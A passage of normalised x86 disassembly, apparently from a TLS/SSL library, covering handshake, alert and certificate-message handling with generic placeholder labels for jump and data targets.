pop ebp
xor eax eax
pop ebx
add esp 0x64
retn
mov edx [ ebx ]
cmp edx 0x14
jne r-xdata
mov eax [ ebp + 0xcc ]
cmp eax edi
jne r-xdata
mov ecx [ ebp + 0x68 ]
mov edx [ ebp + 0x58 ]
push ecx
mov ecx [ ebp ]
push ebp
add edx 0x150
push 0x2
push edx
push 0x15
push ecx
push edi
call eax
add esp 0x1c
mov edx [ ebp + 0xbc ]
cmp edx edi
je r-xdata
mov esi 0x1
xor edi edi
jmp r-xdata
mov edx [ ebx + 0xc ]
mov ecx [ ebx + 0x8 ]
mov edi [ eax ]
mov dl [ edx + ecx ]
mov [ edi + esi ] dl
mov ecx [ eax ]
inc ecx
mov [ eax ] ecx
mov edi [ ebx + 0x8 ]
mov edx [ ebx + 0x4 ]
mov ecx [ esp + 0x78 ]
inc edi
dec edx
dec ecx
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] edx
mov [ esp + 0x78 ] ecx
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ ebp + 0x8 ]
push ebp
call [ eax + 0x3c ]
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov eax [ ebx + 0x4 ]
lea ecx [ edi + 0x4000 ]
cmp eax ecx
ja r-xdata
mov edx [ ebx + 0x4 ]
lea ecx [ edi + 0x4400 ]
cmp edx ecx
ja r-xdata
push eax
call sub_1002b600
mov esi eax
mov eax [ ebx + 0x4 ]
add esp 0x4
lea edx [ esi + edi + 0x4400 ]
cmp eax edx
jbe r-xdata
cmp [ eax + 0x15c ] 0x4
jb r-xdata
cmp [ ebx + 0x4 ] esi
jne r-xdata
mov [ esp + 0x10 ] eax
mov edx [ ebp + 0xd8 ]
mov eax [ edx + 0x9c ]
cmp eax edi
je r-xdata
cmp [ edx + 0xac ] edi
je r-xdata
mov ecx [ ebp + 0x24 ]
cmp ecx edi
jne r-xdata
push 0x1be
push r--data
mov esi 0x16
push 0x92
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebp + 0x50 ] eax
cmp [ ebx + 0x4 ] eax
je r-xdata
push 0x1b0
push r--data
mov esi 0x16
push 0x8c
jmp r-xdata
mov esi [ ebp + 0x58 ]
add esi 0x100
mov edx [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
push edx
mov edx [ esi + 0x14 ]
push ecx
push 0x4000
push edx
push eax
call sub_1001d3f0
add esp 0x14
test eax eax
jl r-xdata
cmp eax esi
jb r-xdata
mov [ esp + 0x78 ] 0x1
cmp edx 0x14
jl r-xdata
cmp [ ebp + 0x1c ] edi
jne r-xdata
push 0x444
push r--data
mov esi 0x2f
push 0x67
jmp r-xdata
cmp [ ebx + 0x8 ] edi
jne r-xdata
cmp ebx 0x1
jne r-xdata
mov eax ebx
shl eax 0x8
or eax esi
push eax
push 0x4004
push ebp
call [ esp + 0x1c ]
add esp 0xc
cmp [ esp + 0x10 ] edi
je r-xdata
mov [ eax + 0x15c ] edi
mov eax [ ebp + 0x58 ]
mov cl [ eax + 0x159 ]
test cl cl
jne r-xdata
xor edi edi
push 0x1b6
push r--data
mov esi 0x1e
push 0x6b
jmp r-xdata
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov edi [ esp + 0x14 ]
mov [ esp + 0x78 ] 0x1
mov [ ebx + 0x4 ] 0x0
mov edi [ ebx + 0xc ]
sub eax esi
add edi eax
mov [ ebx + 0x4 ] eax
mov [ esp + 0x14 ] edi
jmp r-xdata
cmp [ ebp ] 0x301
jne r-xdata
cmp edx 0x16
jle r-xdata
mov edx [ ebp + 0x34 ]
and edx 0xfff
cmp edx 0x3
jne r-xdata
mov ecx [ ebx + 0xc ]
cmp [ ecx ] 0x1
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov ecx [ ebp + 0x58 ]
cmp esi edi
mov [ ecx + 0x198 ] esi
je r-xdata
push 0x3d3
push r--data
mov esi 0x32
push 0x69
jmp r-xdata
mov cl [ eax + 0x15a ]
test cl cl
jne r-xdata
mov edi [ esp + 0x14 ]
mov ecx esi
lea esi [ esp + 0x34 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ esp + 0x34 ]
push 0x0
push edx
mov ecx [ eax + 0x64 ]
push ebp
call [ ecx + 0x4 ]
add esp 0xc
test edi edi
je r-xdata
mov esi 0xa
push 0x494
mov [ ebx + 0x4 ] edi
jmp r-xdata
push 0x49d
push r--data
mov esi 0xa
push 0x44
jmp r-xdata
cmp edx 0x17
je r-xdata
push ebp
call [ ebp + 0x20 ]
add esp 0x4
cmp eax edi
jl r-xdata
test [ eax ] 0x1
jne r-xdata
cmp [ eax + 0x348 ] edi
je r-xdata
push 0x42e
push r--data
mov esi 0x2f
push 0xf6
jmp r-xdata
mov eax [ ebp + 0x58 ]
push 0x424
lea ecx [ esi + 0x3e8 ]
push r--data
push ecx
push 0x94
mov [ ebp + 0x18 ] 0x1
push 0x14
mov [ eax + 0x19c ] esi
call sub_1001de60
push esi
push r--data
lea edx [ esp + 0x40 ]
push 0x10
push edx
call sub_100279b0
lea eax [ esp + 0x48 ]
push eax
push r--data
push ebx
call sub_1001e1a0
mov esi [ ebp + 0x30 ]
mov ecx [ ebp + 0xbc ]
mov edx [ ebp + 0xd8 ]
or esi ebx
push ecx
push edx
mov [ ebp + 0x30 ] esi
call sub_1000f830
add esp 0x38
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov eax [ ebp + 0x30 ]
pop edi
or al 0x2
pop esi
mov [ ebp + 0x30 ] eax
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn
jmp r-xdata
mov cl [ eax + 0x15b ]
test cl cl
jne r-xdata
mov edi [ esp + 0x1c ]
mov ecx [ ebp + 0x58 ]
cmp [ ecx + 0x1b4 ] edi
je r-xdata
je r-xdata
neg ecx
sbb ecx ecx
mov [ ebp + 0x28 ] esi
and ecx 0x1000
add ecx 0x1000
mov [ ebp + 0x34 ] ecx
push 0x44c
push r--data
mov esi 0xa
push 0x85
jmp r-xdata
mov [ ebx + 0x4 ] edi
mov eax [ ebp + 0x64 ]
cmp eax edi
je r-xdata
mov ecx [ ebp + 0x64 ]
cmp ecx edi
je r-xdata
mov esi 0xa
push 0x4ba
jmp r-xdata
cmp [ ecx + 0x1ac ] edi
je r-xdata
push 0x471
test [ ebp + 0xf8 ] 0x4
jne r-xdata
mov edx [ ebp + 0x58 ]
push ebp
mov [ edx + 0x194 ] esi
call sub_100139d0
add esp 0x4
test eax eax
je r-xdata
mov edx [ ebp + 0x68 ]
push edx
push ebp
push esi
push ecx
mov ecx [ ebp ]
push 0x14
push ecx
push edi
call eax
add esp 0x1c
push ebp
call sub_1000e7d0
add esp 0x4
cmp eax 0x3
jne r-xdata
mov edx [ ebp + 0x68 ]
add eax 0x158
push edx
push ebp
push 0x4
push eax
mov eax [ ebp ]
push 0x16
push eax
push edi
call ecx
add esp 0x1c
push r--data
push 0xf5
mov eax [ ebp + 0x34 ]
test ah 0x10
je r-xdata
mov eax [ ebp + 0x58 ]
mov ecx [ eax + 0xec ]
test ecx ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x58 ]
test [ eax ] 0x1
jne r-xdata
test ah 0x20
je r-xdata
cmp eax 0x1110
jl r-xdata
je r-xdata
mov ecx [ eax + 0x1a8 ]
test ecx ecx
jne r-xdata
cmp eax 0x2120
jg r-xdata
cmp eax 0x1120
jle r-xdata
push ebp
mov [ ebp + 0x18 ] 0x3
call sub_1002b5d0
mov esi eax
push 0xf
push esi
call sub_10020900
push 0x9
push esi
call sub_10020920
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
push ebp
call sub_10012410
push ebp
call sub_10012440
add esp 0x8
test eax eax
je r-xdata
cmp eax 0x2110
jl r-xdata
pop edi
pop esi
pop ebp
mov [ ecx + 0x1b4 ] 0x2
or eax 0xffffffff
pop ebx
add esp 0x64
retn
push ebp
call [ ebp + 0x20 ]
add esp 0x4
test eax eax
jl r-xdata
je r-xdata
push 0x3e5
jmp r-xdata
test [ ebp + 0xf8 ] 0x4
jne r-xdata
push r--data
push 0xe5
push 0x94
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov ecx [ ebp + 0x58 ]
mov eax [ ecx + 0xec ]
test eax eax
jmp r-xdata
sub_100139d0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esi + 0x34 ]
mov eax [ esi + 0x58 ]
and edi 0x2000
mov ecx [ eax + 0x378 ]
neg edi
sbb edi edi
and edi 0x10
add edi 0x11
test ecx ecx
jne r-xdata
mov eax [ esi + 0x8 ]
push edi
push esi
mov ecx [ eax + 0x64 ]
call [ ecx + 0x10 ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esi + 0xbc ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x34 ]
test ah 0x10
je r-xdata
pop edi
pop esi
retn
mov eax [ eax + 0x348 ]
push esi
mov [ ecx + 0xac ] eax
mov ecx [ esi + 0x8 ]
mov edx [ ecx + 0x64 ]
call [ edx + 0x8 ]
add esp 0x4
test eax eax
jne r-xdata
push 0x4d6
push r--data
push 0x85
push 0x117
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x20 ]
mov edi [ eax + 0x24 ]
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x64 ]
mov edx [ eax + 0x28 ]
mov edi [ eax + 0x2c ]
jmp r-xdata
pop edi
pop esi
retn
mov ecx [ esi + 0x58 ]
push ebx
lea ebx [ ecx + 0x2bc ]
push ebx
push edi
push edx
lea edx [ ecx + 0x184 ]
add ecx 0x174
push edx
push ecx
push esi
call [ eax + 0x14 ]
mov ecx [ esi + 0x58 ]
add esp 0x18
pop ebx
mov [ ecx + 0x33c ] eax
pop edi
mov eax 0x1
pop esi
retn
sub_10013ab0
mov edx [ esp + 0xc ]
push ebx
push esi
mov esi [ esp + 0xc ]
push edx
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x64 ]
call [ ecx + 0x30 ]
mov ebx eax
mov eax [ esi ]
add esp 0x4
cmp eax 0x300
jne r-xdata
test ebx ebx
jl r-xdata
cmp ebx 0x46
jne r-xdata
pop esi
pop ebx
retn
cmp [ esp + 0x10 ] 0x2
jne r-xdata
mov ebx 0x28
jmp r-xdata
mov ecx [ esi + 0x58 ]
mov al [ esp + 0x10 ]
mov [ ecx + 0x1a0 ] 0x1
mov edx [ esi + 0x58 ]
mov [ edx + 0x1a4 ] al
mov ecx [ esi + 0x58 ]
mov [ ecx + 0x1a5 ] bl
mov edx [ esi + 0x58 ]
mov eax [ edx + 0xfc ]
test eax eax
jne r-xdata
mov eax [ esi + 0xbc ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
push esi
call [ eax + 0x3c ]
add esp 0x4
push eax
mov eax [ esi + 0xd8 ]
push eax
call sub_1000f830
add esp 0x8
sub_10013b40
push esi
mov esi [ esp + 0x8 ]
push edi
push 0x0
mov eax [ esi + 0x58 ]
push 0x2
mov [ eax + 0x1a0 ] 0x0
mov ecx [ esi + 0x58 ]
add ecx 0x1a4
push ecx
push 0x15
push esi
call sub_10012980
mov edi eax
add esp 0x14
test edi edi
jg r-xdata
mov eax [ esi + 0x58 ]
cmp [ eax + 0x1a4 ] 0x2
jne r-xdata
mov edx [ esi + 0x58 ]
pop edi
pop esi
mov [ edx + 0x1a0 ] 0x1
retn
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x10 ]
push 0x0
push 0x0
push 0xb
push ecx
call sub_10020c60
add esp 0x10
mov ecx [ esi + 0xcc ]
test ecx ecx
jne r-xdata
mov edx [ esi + 0x68 ]
mov ecx [ esi + 0x58 ]
push edx
mov edx [ esi ]
push esi
add ecx 0x1a4
push 0x2
push ecx
push 0x15
push edx
push 0x1
call eax
add esp 0x1c
mov eax [ esi + 0x58 ]
xor edx edx
mov dh [ eax + 0x1a4 ]
mov dl [ eax + 0x1a5 ]
push edx
push 0x4008
push esi
call ecx
add esp 0xc
mov eax [ esi + 0xd8 ]
mov ecx [ eax + 0x9c ]
test ecx ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn
sub_10013c00
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx [ esp + 0x10 ]
push edi
mov eax [ esi + 0x44 ]
mov ecx [ esi + 0x3c ]
push eax
mov eax [ esi + 0x48 ]
mov edx [ ecx + 0x4 ]
add edx eax
push edx
push ebx
push esi
call sub_100128a0
mov edi eax
add esp 0x10
test edi edi
jge r-xdata
cmp ebx 0x16
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
retn
mov eax [ esi + 0x44 ]
cmp edi eax
jne r-xdata
mov eax [ esi + 0x3c ]
push edi
mov ecx [ eax + 0x4 ]
mov eax [ esi + 0x48 ]
add ecx eax
push ecx
push esi
call sub_1001a640
add esp 0xc
mov edx [ esi + 0x48 ]
sub eax edi
add edx edi
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] edx
pop edi
pop esi
xor eax eax
pop ebx
retn
mov ecx [ esi + 0x64 ]
test ecx ecx
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov edx [ esi + 0x68 ]
push edx
mov edx [ esi + 0x48 ]
add edx eax
mov eax [ esi + 0x3c ]
push esi
push edx
mov edx [ eax + 0x4 ]
mov eax [ esi ]
push edx
push ebx
push eax
push 0x1
call ecx
add esp 0x1c
sub_10013ca0
mov ecx [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
mov eax [ ebx + 0x34 ]
cmp eax ecx
jne r-xdata
push 0x16
push ebx
call sub_10013c00
add esp 0x8
pop ebx
retn
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x58 ]
push ebp
mov ebp [ ecx + 0x4 ]
mov ecx [ edx + 0x64 ]
push esi
lea edx [ eax + 0x238 ]
push edi
push edx
mov edx [ esp + 0x28 ]
push edx
mov edx [ esp + 0x28 ]
push edx
lea edx [ eax + 0x184 ]
add eax 0x174
push edx
push eax
push ebx
call [ ecx + 0x14 ]
mov ecx [ ebx + 0x58 ]
lea edi [ ebp + 0x4 ]
add esp 0x18
mov [ ecx + 0x2b8 ] eax
mov esi [ ebx + 0x58 ]
mov ecx eax
add esi 0x238
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
inc ebp
[ edi ] [ esi ]
mov [ ebp - 0x1 ] 0x14
mov ecx eax
shr ecx 0x10
shr edx 0x8
mov [ ebp + 0x2 ] al
add eax 0x4
mov [ ebp ] cl
mov [ ebp + 0x1 ] dl
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x1c ]
pop edi
pop esi
mov [ ebx + 0x48 ] 0x0
mov [ ebx + 0x34 ] eax
pop ebp
sub_10013d50
mov edx [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x8 ]
lea ecx [ esp + 0x8 ]
push esi
push ecx
mov ecx [ esp + 0x14 ]
mov eax [ ebx + 0x8 ]
push 0x40
push 0x14
push edx
push ecx
push ebx
call [ eax + 0x30 ]
mov ecx [ esp + 0x24 ]
add esp 0x18
test ecx ecx
je r-xdata
pop esi
pop ebx
retn
mov ecx [ ebx + 0x58 ]
mov edx [ ecx + 0x194 ]
test edx edx
jne r-xdata
mov [ ecx + 0x194 ] 0x0
mov edx [ ebx + 0x58 ]
mov esi [ ebx + 0x40 ]
mov ecx [ edx + 0x33c ]
cmp ecx eax
je r-xdata
push 0xd5
push r--data
mov esi 0xa
push 0x9a
jmp r-xdata
push edi
lea edi [ edx + 0x2bc ]
xor edx edx
[ esi ] [ edi ]
pop edi
je r-xdata
push 0xe0
push r--data
mov esi 0x32
push 0x6f
jmp r-xdata
push 0x8c
push 0x14
call sub_1001de60
add esp 0x14
push esi
push 0x2
push ebx
call sub_10013ab0
add esp 0xc
xor eax eax
pop esi
pop ebx
retn
mov eax 0x1
push 0xe7
push r--data
mov esi 0x33
push 0x95
sub_10013e20
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax + 0x34 ]
cmp ecx edx
jne r-xdata
push 0x14
push eax
call sub_10013c00
add esp 0x8
retn
mov edx [ eax + 0x3c ]
mov ecx [ edx + 0x4 ]
mov edx [ esp + 0xc ]
mov [ ecx ] 0x1
mov [ eax + 0x44 ] 0x1
mov [ eax + 0x48 ] 0x0
mov [ eax + 0x34 ] edx
sub_10013e60
mov eax 0x88
call sub_1001d0d0
mov eax [ esp + 0x8c ]
push ebx
push ebp
push esi
mov cl [ eax + 0xf8 ]
push edi
test cl 0x8
mov ebx 0x7
jne r-xdata
mov ebp 0x1
mov ecx [ eax + 0xd8 ]
mov edx [ ecx + 0x94 ]
test edx edx
jne r-xdata
mov edi [ esp + 0xa0 ]
test edi edi
je r-xdata
push 0x11f
jmp r-xdata
xor ebp ebp
jmp r-xdata
mov ecx [ esp + 0x9c ]
mov edx [ ecx + 0xd8 ]
mov eax [ edx + 0x94 ]
test eax eax
je r-xdata
test ebp ebp
jne r-xdata
push r--data
push 0x7
mov esi [ eax + 0x3c ]
push 0xa
push esi
call sub_1001dd90
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
sub ebx 0x7
mov edx ebx
add eax 0x4
shr edx 0x10
mov [ esp + 0x10 ] eax
mov [ eax ] dl
mov ecx [ esp + 0x10 ]
mov eax ebx
shr eax 0x8
mov [ ecx + 0x1 ] al
mov edx [ esp + 0x10 ]
pop edi
mov [ edx + 0x2 ] bl
mov ebp [ esp + 0xc ]
add ebp 0x3
add ebx 0x3
mov [ esp + 0xc ] ebp
mov esi [ esi + 0x4 ]
mov [ esp + 0xc ] esi
mov ecx ebx
mov [ esi ] 0xb
mov eax [ esp + 0xc ]
inc eax
mov edx ebx
shr ecx 0x10
mov [ esp + 0xc ] eax
mov [ eax ] cl
mov eax [ esp + 0xc ]
pop esi
shr edx 0x8
mov [ eax + 0x1 ] dl
mov ecx [ esp + 0x8 ]
lea eax [ ebx + 0x4 ]
pop ebp
mov [ ecx + 0x2 ] bl
pop ebx
add esp 0x88
retn
push eax
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x0
push edi
call sub_10022840
mov [ esp + 0x1c ] eax
add eax 0xa
push eax
push esi
call sub_1001dd90
add esp 0x10
test eax eax
je r-xdata
mov edx [ esp + 0x9c ]
push ebp
push ebp
mov eax [ edx + 0xd8 ]
lea edx [ esp + 0x2c ]
mov ecx [ eax + 0xc ]
push ecx
push edx
call sub_100286b0
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esp + 0x9c ]
push edi
mov ecx [ eax + 0xd8 ]
mov edx [ ecx + 0x94 ]
push edx
call sub_1001e7c0
mov ebp eax
push 0x0
push ebp
call sub_10022840
mov [ esp + 0x24 ] eax
lea eax [ eax + ebx + 0x3 ]
push eax
push esi
mov [ esp + 0x30 ] eax
call sub_1001dd90
add esp 0x18
test eax eax
je r-xdata
push 0x12f
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x4 ]
mov edx ecx
add eax ebx
sar edx 0x10
mov [ esp + 0x10 ] eax
mov [ eax ] dl
mov edx [ esp + 0x10 ]
mov eax ecx
sar eax 0x8
mov [ edx + 0x1 ] al
mov eax [ esp + 0x10 ]
mov [ eax + 0x2 ] cl
mov ecx [ esp + 0x10 ]
add ecx 0x3
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x10 ]
push ecx
push edi
call sub_10022840
mov edx [ esp + 0x1c ]
add esp 0x8
test ebp ebp
lea ebx [ ebx + edx + 0x3 ]
jne r-xdata
push 0x126
push r--data
push 0xb
jmp r-xdata
push 0x151
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x4 ]
mov edx ecx
add eax ebx
sar edx 0x10
mov [ esp + 0x10 ] eax
mov [ eax ] dl
mov edx [ esp + 0x10 ]
mov eax ecx
sar eax 0x8
mov [ edx + 0x1 ] al
mov eax [ esp + 0x10 ]
mov [ eax + 0x2 ] cl
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x10 ]
add eax 0x3
push ecx
push ebp
mov [ esp + 0x18 ] eax
call sub_10022840
mov edx [ esp + 0xa4 ]
mov ebx [ esp + 0x20 ]
inc edi
mov eax [ edx + 0xd8 ]
mov ecx [ eax + 0x94 ]
push ecx
call sub_1001e7b0
add esp 0xc
cmp edi eax
jl r-xdata
push edi
call sub_10021330
add esp 0x4
push eax
push edi
call sub_10021340
add esp 0x4
push eax
call sub_10021390
add esp 0x8
test eax eax
je r-xdata
push 0x93
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x88
retn
lea eax [ esp + 0x24 ]
push eax
call sub_10028ee0
add esp 0x4
lea eax [ esp + 0x1c ]
push eax
push edi
call sub_10021330
add esp 0x4
lea ecx [ esp + 0x28 ]
push eax
push 0x1
push ecx
call sub_10021d10
add esp 0x10
test eax eax
jle r-xdata
mov edi [ esp + 0x20 ]
push edi
call sub_10022870
push ebp
push edi
call sub_10022840
lea edx [ eax + ebx + 0x3 ]
mov [ esp + 0x20 ] eax
push edx
push esi
call sub_1001dd90
add esp 0x14
test eax eax
jne r-xdata
sub_10014170
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
xor ebx ebx
push edi
mov eax [ esi + 0x58 ]
cmp [ eax + 0x358 ] ebx
je r-xdata
mov eax [ esi + 0x3c ]
mov ecx [ esi + 0x34 ]
mov edi [ eax + 0x4 ]
mov eax [ esp + 0x18 ]
cmp ecx eax
jne r-xdata
mov [ eax + 0x358 ] ebx
mov eax [ esp + 0x20 ]
cmp eax ebx
jl r-xdata
mov eax [ esi + 0x58 ]
mov ecx [ esi + 0x44 ]
mov ebp [ esi + 0x40 ]
mov edi [ eax + 0x340 ]
sub edi ecx
cmp edi ebx
jle r-xdata
cmp [ esi + 0x44 ] 0x4
jge r-xdata
mov edx [ esp + 0x28 ]
pop edi
mov [ edx ] 0x1
mov eax [ esi + 0x3c ]
mov edx [ esi + 0x58 ]
mov ecx [ eax + 0x4 ]
add ecx 0x4
mov [ esi + 0x40 ] ecx
mov eax [ edx + 0x340 ]
mov [ esi + 0x44 ] eax
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x58 ]
cmp [ ecx + 0x344 ] eax
je r-xdata
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x3c ]
add edx 0x4
mov ecx [ eax + 0x4 ]
push edx
push ecx
push esi
call sub_1001a640
mov eax [ esi + 0x64 ]
add esp 0xc
cmp eax ebx
je r-xdata
mov edx [ esi + 0x44 ]
mov ecx [ esi + 0x8 ]
push ebx
add edx ebp
push edi
push edx
push 0x16
push esi
call [ ecx + 0x34 ]
add esp 0x14
cmp eax ebx
jle r-xdata
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax [ esi + 0x44 ]
mov edx [ esi + 0x8 ]
mov ecx 0x4
push ebx
sub ecx eax
add eax edi
push ecx
push eax
push 0x16
push esi
call [ edx + 0x34 ]
add esp 0x14
cmp eax ebx
jle r-xdata
push 0x177
push r--data
mov edi 0xa
push 0xf4
jmp r-xdata
mov eax [ esp + 0x28 ]
pop edi
mov [ eax ] 0x1
mov eax [ esi + 0x44 ]
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x68 ]
mov ecx [ esi + 0x44 ]
push edx
mov edx [ esi + 0x3c ]
add ecx 0x4
push esi
push ecx
mov ecx [ edx + 0x4 ]
mov edx [ esi ]
push ecx
push 0x16
push edx
push ebx
call eax
add esp 0x1c
mov ecx [ esp + 0x28 ]
mov [ esi + 0x18 ] 0x3
pop edi
pop esi
mov [ ecx ] ebx
pop ebp
pop ebx
retn
mov edx [ esi + 0x44 ]
sub edi eax
add edx eax
cmp edi ebx
mov [ esi + 0x44 ] edx
jg r-xdata
mov eax [ esp + 0x20 ]
mov ebp [ esp + 0x1c ]
cmp eax ebx
jl r-xdata
cmp [ edi ] bl
jne r-xdata
mov edx [ esp + 0x28 ]
mov [ esi + 0x18 ] 0x3
pop edi
pop esi
mov [ edx ] ebx
pop ebp
pop ebx
retn
mov ecx [ esi + 0x44 ]
add ecx eax
mov eax ecx
mov [ esi + 0x44 ] ecx
cmp eax 0x4
jl r-xdata
push 0x8e
push 0x14
call sub_1001de60
add esp 0x14
push edi
push 0x2
push esi
call sub_10013ab0
mov edx [ esp + 0x34 ]
add esp 0xc
or eax 0xffffffff
pop edi
pop esi
mov [ edx ] ebx
pop ebp
pop ebx
retn
cmp [ edi ] 0x1
jne r-xdata
xor ecx ecx
mov cl [ edi ]
cmp ecx eax
je r-xdata
cmp [ edi + 0x1 ] bl
jne r-xdata
mov eax [ esi + 0x58 ]
xor edx edx
mov dl [ edi ]
inc edi
xor ecx ecx
mov [ eax + 0x344 ] edx
mov cl [ edi + 0x1 ]
mov eax [ esp + 0x24 ]
mov ch [ edi ]
xor edx edx
mov dl [ edi + 0x2 ]
shl ecx 0x8
or ecx edx
mov edi ecx
cmp edi eax
jbe r-xdata
cmp [ esp + 0x18 ] 0x2180
jne r-xdata
push 0x1ac
push r--data
mov edi 0xa
push 0xf4
jmp r-xdata
cmp [ edi + 0x2 ] bl
jne r-xdata
cmp edi 0x7ffffffb
jbe r-xdata
mov edi 0x2f
push 0x1c1
jmp r-xdata
cmp ebp 0x2181
jne r-xdata
cmp [ edi + 0x3 ] bl
jne r-xdata
cmp edi ebx
je r-xdata
mov edi 0x2f
push 0x1c7
push r--data
push 0x98
push esi
call sub_1001a5e0
add esp 0x4
mov eax [ esi + 0x64 ]
mov [ esi + 0x44 ] ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x58 ]
mov [ eax + 0x340 ] edi
mov ecx [ esi + 0x3c ]
mov [ esi + 0x34 ] ebp
mov edx [ ecx + 0x4 ]
mov [ esi + 0x44 ] ebx
add edx 0x4
mov [ esi + 0x40 ] edx
mov ecx [ esi + 0x3c ]
lea eax [ edi + 0x4 ]
push eax
push ecx
call sub_1001dd90
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov ecx [ esi ]
push edx
push esi
push 0x4
push edi
push 0x16
push ecx
push ebx
call eax
add esp 0x1c
jmp r-xdata
push 0x1cc
push r--data
push 0x7
push 0x8e
push 0x14
call sub_1001de60
mov edx [ esp + 0x3c ]
add esp 0x14
pop edi
pop esi
mov [ edx ] ebx
pop ebp
or eax 0xffffffff
pop ebx
retn
sub_10014430
push esi
push edi
mov edi [ esp + 0x10 ]
or esi 0xffffffff
test edi edi
jne r-xdata
mov eax edi
mov eax [ esp + 0xc ]
push eax
call sub_10021790
add esp 0x4
jmp r-xdata
test edi edi
jne r-xdata
mov ecx [ eax ]
cmp ecx 0x6
jne r-xdata
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
retn
push eax
call sub_10023940
add esp 0x4
cmp ecx 0x74
jne r-xdata
xor esi esi
jmp r-xdata
cmp ecx 0x198
jne r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x5
sub_10014490
mov eax [ esp + 0x4 ]
add eax 0xfffffffe
cmp eax 0x30
ja r-xdata
mov eax 0x2e
retn
xor ecx ecx
mov cl [ eax + lookup_table_10014508 ]
jmp [ ecx * 4 + jump_table_100144e4 ]
mov eax 0x30
retn
mov eax 0x2a
retn
mov eax 0x33
retn
mov eax 0x2d
retn
mov eax 0x2c
retn
mov eax 0x50
retn
mov eax 0x28
retn
mov eax 0x2b
retn
sub_10014540
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x58 ]
mov ecx [ eax + 0xe0 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0x58 ]
mov ecx [ eax + 0xf0 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xf4 ]
push 0x25a
and eax 0xff
push r--data
and eax 0x20
shl eax 0x9
lea edi [ eax + 0x4805 ]
push edi
call sub_1001d4c0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0x58 ]
pop edi
mov ecx [ eax + 0xe0 ]
mov eax 0x1
mov [ esi + 0x4c ] ecx
pop esi
retn
push 0x264
push r--data
push 0x490a
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
push 0x26c
push r--data
push 0x41
push 0x9c
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
mov ecx [ esi + 0x58 ]
mov [ ecx + 0xe0 ] eax
mov edx [ esi + 0x58 ]
mov [ edx + 0xe4 ] edi
mov ecx [ esi + 0x58 ]
mov [ ecx + 0xf0 ] eax
mov edx [ esi + 0x58 ]
mov [ edx + 0xf4 ] 0x490a
sub_10014620
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_10011330
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push esi
call [ eax + 0x8 ]
add esp 0x4
mov eax 0x1
pop esi
retn
pop esi
retn
sub_10014680
mov eax 0x4
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x14 ]
push ebp
lea edx [ eax + 0x2 ]
push esi
cmp edx ebx
push edi
mov [ esp + 0x10 ] edx
jb r-xdata
mov ebp [ esp + 0x18 ]
mov edi [ ebp + 0x110 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push 0x0
push 0x0
push 0x20
